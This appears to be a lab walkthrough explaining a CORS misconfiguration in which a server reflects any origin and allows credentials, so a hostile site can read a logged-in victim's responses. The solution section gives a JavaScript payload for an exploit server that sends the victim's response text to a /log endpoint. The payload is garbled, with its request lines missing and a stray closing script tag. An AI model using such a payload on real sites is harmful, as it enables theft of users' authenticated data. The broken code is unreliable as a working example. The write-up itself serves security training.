CORS Misconfiguration: Reflecting Arbitrary Origins
What's happening, step by step:

1. The Problem Setup
A server needs to allow multiple domains, so instead of maintaining a strict allowlist, it takes a shortcut, it automatically trusts whatever origin sends the request.

2. Attacker Sends a Request
A malicious site sends a cross-origin request, including its own origin in the header:

   Origin: https://malicious-website.com

3. Server Blindly Reflects It
The server reads that Origin header and mirrors it back in the response:

   Access-Control-Allow-Origin: https://malicious-website.com
   Access-Control-Allow-Credentials: true

4. Credentials Are Included
Because Allow-Credentials: true is set, the browser also sends the victim's cookies/session tokens with the request.

5. Any Domain Gets Access
Since the server approves any origin that asks, an attacker can read sensitive responses from the vulnerable domain — authenticated, in-session.


Now how to solve:

1. Logged In as given credentials

2. Go to the exploit server and Inject the following payload in the exploit server

    const req = new XMLHttpRequest();

        location='/log?key='+this.responseText;

</script>
